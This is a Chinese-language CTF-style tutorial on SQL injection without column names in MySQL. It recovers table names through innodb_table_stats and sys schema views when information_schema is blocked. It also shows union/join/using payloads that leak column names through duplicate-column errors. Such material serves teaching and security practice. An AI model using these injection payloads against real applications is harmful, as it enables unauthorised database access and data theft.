无列名注入

基础知识

众所周知，information_schema作为一个记录了mysql中所有表的数据库，我们经常都会用它来查询信息，在部分题目里面，information_schema是会被ban掉的，那么这个时候我们就要考虑如何去绕过了

我们想要得到表名其实可以使用其他方法：

innoDb

mysql 5.5.8之后开始使用InnoDb作为默认引擎，mysql 5.6的InnoDb增加了innodb_index_stats和innodb_table_stats两张表

这两张表存有数据库和列名，但是没有表名：

select group_concat(database_name) from mysql.innodb_index_stats;
select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()

但是这里是没有列名的

sys

我们不止可以利用innodb，还可以利用sys库，MySQL 5.7开始增加了sys库，这个库可以用于快速了解系统元数据信息。sys库通过视图的形式把information_schema和performance_schema结合起来，查询令人容易理解的数据

使用这个库的时候就需要分一下下情况了

-存在自增字段：
这个时候可以用sys.schema_auto_increment_columns，它保存了含有自增字段的数据库的信息，自增字段：就是 MySQL 自动帮你生成的、唯一递增的编号（比如 id）

#查询数据库名
select table_schema from sys.schema_auto_increment_columns
#查询表名
select table_name from sys.schema_auto_increment_columns where table_schema=databse()

-而没有自增字段的时候就需要拿另外一个了schema_table_statistics_with_buffer

查询数据库：

select table_schema from sys.schema_table_statistics_with_buffer;
select table_schema from sys.x$schema_table_statistics_with_buffer;

查询指定数据库的表：

select table_name from sys.schema_table_statistics_with_buffer where table_schema=database();
select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=database();

join using

这是在无列名注入里面使用频率非常高的命令，详细的写在例题里面了

在这里就简单概括一下：

join用于合并两个表，而我们要做的就是利用其合并的特性，让临时表中存在相同名字的列，在进行查询时触发报错

假设有个表叫user，它的结构如下：

users

id
username
password

我们执行select * from users u1 join users u2

那么就会有：

u1.id
u1.username
u1.password
u2.id
u2.username
u2.password

这个时候进行例如

-1’ union select * from (select * from users u1 join users u2)u–+

那么题目就会因为重复列名而报错，但是往往我们又不能一次就拿到全部的信息，这个时候就用using来进行排查了

?id=-1’ union select * from (select * from users u1 join users u2 using(id))u–+

using就是把相同的连接起来，避免重名

我们同样假设user表：

SELECT * FROM users u1 JOIN users u2 USING(id)

就会变成：

id
username
password
username
password

也就是说这里不会再爆id了，实现了我们继续查询的目的
